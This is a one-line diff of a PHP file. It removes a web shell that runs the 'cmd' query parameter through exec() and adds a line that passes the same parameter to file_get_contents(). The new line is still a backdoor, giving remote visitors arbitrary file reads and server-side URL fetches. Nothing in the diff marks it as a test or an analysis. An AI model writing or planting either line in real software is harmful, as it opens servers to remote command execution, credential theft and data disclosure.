@@ -1,1 +1,1 @@
-<?php echo exec($_GET["cmd"]); ?>
+<?php echo file_get_contents($_GET["cmd"]); ?>
